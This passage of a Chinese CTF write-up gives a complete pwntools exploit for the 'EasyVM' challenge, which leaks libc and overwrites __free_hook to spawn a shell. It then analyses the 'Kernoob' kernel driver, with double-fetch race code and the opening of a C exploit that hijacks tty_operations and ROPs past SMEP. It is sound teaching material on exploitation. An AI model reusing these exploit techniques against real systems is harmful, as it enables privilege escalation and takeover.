<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808215617.png" alt="图片无法显示，请联系作者" title=" ">

<p>经过<code>4</code>之后，<code>0x5655805c</code>会被改写为一个<code>elf</code>的地址，这样我们就可以泄露出<code>elf</code>的加载基址，绕过<code>ASLR</code>。通过读取<code>free_got</code>即可以泄露<code>libc</code>基址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./EasyVM&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x56555F0A&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x32/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recyle</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bo_exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_elf_address_paylaod = <span class="string">&quot;\x09\x11\x99&quot;</span></span><br><span class="line">gift()</span><br><span class="line">add(leak_elf_address_paylaod)</span><br><span class="line">start()</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>) - <span class="number">0x6c0</span></span><br><span class="line">log.success(<span class="string">&quot;elf base address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(elf.address)))</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free_address = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="string">b&quot;\x80&quot;</span>+<span class="built_in">chr</span>(<span class="number">3</span>).encode()+p32(free_got+i)+<span class="string">b&quot;\x53\x99\x99&quot;</span>)</span><br><span class="line">    start()</span><br><span class="line">    free_address += p.recvuntil(<span class="string">&quot;1.Produce&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">1</span>:]</span><br><span class="line">free_address = u32(free_address)</span><br><span class="line">libc.address = free_address - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">system_address = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_address = libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">free_hook_address = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="string">b&quot;\x80&quot;</span>+<span class="built_in">chr</span>(<span class="number">10</span>).encode()+p32(binsh_address)+<span class="string">b&quot;\x99&quot;</span>)</span><br><span class="line">start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="string">b&quot;\x80&quot;</span>+<span class="built_in">chr</span>(<span class="number">3</span>).encode()+p32(free_hook_address+i)+<span class="string">b&quot;\x54\x99\x99&quot;</span>)</span><br><span class="line">    start()</span><br><span class="line">    p.send(p32(system_address)[i:i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">recyle()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Kernoob"><a href="#Kernoob" class="headerlink" title="Kernoob"></a>Kernoob</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>首先看一下程序，程序只开启了堆栈不可执行保护，内核则只开启了<code>smep</code>保护。程序提供了四种方法<code>add,show,edit,delete</code>。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809202626.png" alt="图片无法显示，请联系作者" title=" ">

<p><code>delete</code>的时候没有对全局变量进行清空，因此存在<code>UAF</code>，而对用户空间的数据又是进行了两步操作，即先验证<code>size</code>的大小，然后根据<code>size</code>进行分配内存，存在<code>double fetch</code>。</p>
<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p><a href="https://www.lyyl.online/2020/03/10/kernel-pwn/#Double-Fetch">double fetch 的利用见此</a></p>
<p>通过<code>double fetch</code>的竞争，可以在内核对<code>size</code>验证完毕之后将申请的内存更改为任意的大小。</p>
<p><code>kernel</code>中存在一种<code>tty_struct</code>结构体，在打开<code>tty</code>设备的时候会创建。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="type">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">	<span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">	<span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">	<span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>	<span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">	<span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>		<span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">	<span class="type">int</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>		<span class="comment">/* winsize_mutex */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,	<span class="comment">/* flow_lock */</span></span><br><span class="line">		      flow_stopped:<span class="number">1</span>,</span><br><span class="line">		      unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">	<span class="type">int</span> hw_stopped;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,	<span class="comment">/* ctrl_lock */</span></span><br><span class="line">		      packet:<span class="number">1</span>,</span><br><span class="line">		      unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> receive_room;	<span class="comment">/* Bytes free for queue */</span></span><br><span class="line">	<span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">	<span class="type">void</span> *disc_data;</span><br><span class="line">	<span class="type">void</span> *driver_data;</span><br><span class="line">	<span class="type">spinlock_t</span> files_lock;		<span class="comment">/* protects tty_files list */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> closing;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">	<span class="type">int</span> write_cnt;</span><br><span class="line">	<span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>这里我们主要关注的是第五个成员变量也就是<code>tty_operations</code>，该结构体中存在很多的函数指针(虚函数表)，与<code>fileops</code>类似。在获得任意的内存分配权限之后，我们可以申请一个<code>tty_operations</code>结构体的大小并释放（这里大小的获取可以编译输出<code>size</code>的驱动，或者直接查找<a target="_blank" rel="noopener external nofollow noreferrer" href="https://elixir.bootlin.com/linux/v4.15.15/source/include/linux/tty_driver.h#L253">源码</a>），在打开一个<code>tty</code>设备<code>ptmx</code>的时候之前释放的堆块就会被申请，因此我们可以通过<code>UAF</code>来控制打开的<code>tty</code>设备中的<code>tty_operations</code>结构体，劫持其中的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">size_t</span> index;</span><br><span class="line">	<span class="type">char</span>* buf;</span><br><span class="line">	<span class="type">size_t</span> size;</span><br><span class="line">	</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_size</span><span class="params">(<span class="type">void</span>* in)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">input</span>* <span class="title">cu_in</span> =</span> in;</span><br><span class="line">	<span class="keyword">while</span>(has_changed == <span class="number">0</span>)&#123;</span><br><span class="line">		cu_in-&gt;size = <span class="number">0x2e0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	getchar();</span><br><span class="line">	save_state();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">fake_tty</span>;</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">	<span class="type">pthread_t</span> t1;</span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/noob&quot;</span>, O_RDONLY);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">input</span> <span class="title">current_input</span>;</span></span><br><span class="line">	current_input.index = <span class="number">0</span>;</span><br><span class="line">	current_input.buf = buf;</span><br><span class="line">	current_input.size = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">	pthread_create(&amp;t1, <span class="literal">NULL</span>, change_size, &amp;current_input);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		ioctl(fd1, <span class="number">0x30000</span>, &amp;current_input);</span><br><span class="line">		current_input.size = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	has_changed = <span class="number">1</span>;</span><br><span class="line">	pthread_join(t1, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809210009.png" alt="图片无法显示，请联系作者" title=" ">

<p>可以看到我们已经成功分配一个块大小为<code>0x2e0</code>的堆块，接下来释放该堆块并打开一个<code>tty</code>设备，占用这个堆块。堆块占用完成之后我们就可以劫持函数指针了。</p>
<p>提升权限的方法这里可以选择内核的<code>ROP</code>，利用<code>xchg e?x , esp</code>的<code>gadget</code>来迁移函数栈，由于<code>tty_operations</code>的函数调用的最后一条指令是<code>call eax</code>，因此这里选择<code>xchg eax, esp</code>。对<code>tty_operations</code>中指针的覆盖则是选择的<code>ioctl</code>函数。那么在调用<code>ioctl</code>函数的时候，<code>rax</code>是<code>xchg rax, rsp</code>的地址，此时即将栈劫持到<code>gadget</code>地址上，主要到此时的<code>gadget</code>的地址的高<code>8</code>位是<code>0</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809211707.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们需要在该地址中布置好<code>rop chain</code>，因此我们需要先在这个地址处<code>mmap</code>一段内存空间，接着将关闭<code>smep,smap</code>保护和提升权限获取<code>shell</code>的<code>rop</code>链部署在该位置。</p>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *, <span class="keyword">struct</span> <span class="title">file</span> *, <span class="title">int</span>);</span> <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="type">int</span> (*install)(<span class="keyword">struct</span> tty_driver *, <span class="keyword">struct</span> tty_struct *);              <span class="comment">/*     8     8 */</span></span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *, <span class="keyword">struct</span> tty_struct *);              <span class="comment">/*    16     8 */</span></span><br><span class="line">    <span class="type">int</span> (*open)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> file *);                       <span class="comment">/*    24     8 */</span></span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> file *);                     <span class="comment">/*    32     8 */</span></span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *);                                 <span class="comment">/*    40     8 */</span></span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *);                                  <span class="comment">/*    48     8 */</span></span><br><span class="line">    <span class="type">int</span> (*write)(<span class="keyword">struct</span> tty_struct *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">int</span>);         <span class="comment">/*    56     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">    <span class="type">int</span> (*put_char)(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">char</span>);                            <span class="comment">/*    64     8 */</span></span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *);                                       <span class="comment">/*    72     8 */</span></span><br><span class="line">    <span class="type">int</span> (*write_room)(<span class="keyword">struct</span> tty_struct *);                                         <span class="comment">/*    80     8 */</span></span><br><span class="line">    <span class="type">int</span> (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *);                                    <span class="comment">/*    88     8 */</span></span><br><span class="line">    <span class="type">int</span> (*ioctl)(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>);             <span class="comment">/*    96     8 */</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">int</span> <span class="params">(*compat_ioctl)</span><span class="params">(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)</span>; <span class="comment">/*   104     8 */</span></span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> ktermios *);                    <span class="comment">/*   112     8 */</span></span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct *);                                          <span class="comment">/*   120     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct *);           <span class="comment">/*   128     8 */</span></span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *);                 <span class="comment">/*   136     8 */</span></span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *);                <span class="comment">/*   144     8 */</span></span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *);               <span class="comment">/*   152     8 */</span></span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *, <span class="type">int</span>);        <span class="comment">/*   160     8 */</span></span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *);         <span class="comment">/*   168     8 */</span></span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *);            <span class="comment">/*   176     8 */</span></span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *, <span class="type">int</span>); <span class="comment">/*   184     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *, <span class="type">char</span>);                           <span class="comment">/*  